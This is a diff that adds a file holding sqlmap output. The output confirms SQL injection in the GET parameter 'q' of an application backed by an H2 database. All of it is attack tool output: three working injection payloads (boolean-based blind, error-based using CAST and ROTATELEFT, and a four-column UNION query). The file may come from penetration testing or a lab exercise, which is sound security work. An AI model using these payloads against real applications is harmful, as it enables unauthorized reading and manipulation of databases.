@@ -1,0 +1,16 @@
+sqlmap identified the following injection point(s) with a total of 56 HTTP(s) requests:
+---
+Parameter: q (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: q=test' AND 4939=(SELECT (CASE WHEN (4939=4939) THEN 4939 ELSE (SELECT 3469 UNION SELECT 8588) END))-- Oglh
+
+    Type: error-based
+    Title: H2 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (CAST)
+    Payload: q=test' AND 6678=ROTATELEFT(CAST(CHAR(113)||CHAR(107)||CHAR(120)||CHAR(122)||CHAR(113)||(SELECT CASE WHEN (6678=6678) THEN CHAR(49) ELSE CHAR(48) END)||CHAR(113)||CHAR(98)||CHAR(106)||CHAR(112)||CHAR(113) AS INT),1) AND 'HRtN'='HRtN
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: q=test' UNION ALL SELECT NULL,NULL,NULL,CHAR(113)||CHAR(107)||CHAR(120)||CHAR(122)||CHAR(113)||CHAR(74)||CHAR(67)||CHAR(112)||CHAR(65)||CHAR(83)||CHAR(105)||CHAR(107)||CHAR(119)||CHAR(68)||CHAR(73)||CHAR(74)||CHAR(109)||CHAR(78)||CHAR(100)||CHAR(84)||CHAR(86)||CHAR(101)||CHAR(107)||CHAR(88)||CHAR(68)||CHAR(97)||CHAR(89)||CHAR(97)||CHAR(105)||CHAR(85)||CHAR(78)||CHAR(71)||CHAR(116)||CHAR(88)||CHAR(97)||CHAR(81)||CHAR(67)||CHAR(105)||CHAR(89)||CHAR(74)||CHAR(74)||CHAR(76)||CHAR(90)||CHAR(72)||CHAR(113)||CHAR(113)||CHAR(98)||CHAR(106)||CHAR(112)||CHAR(113)-- qtBC
+---
+back-end DBMS: H2
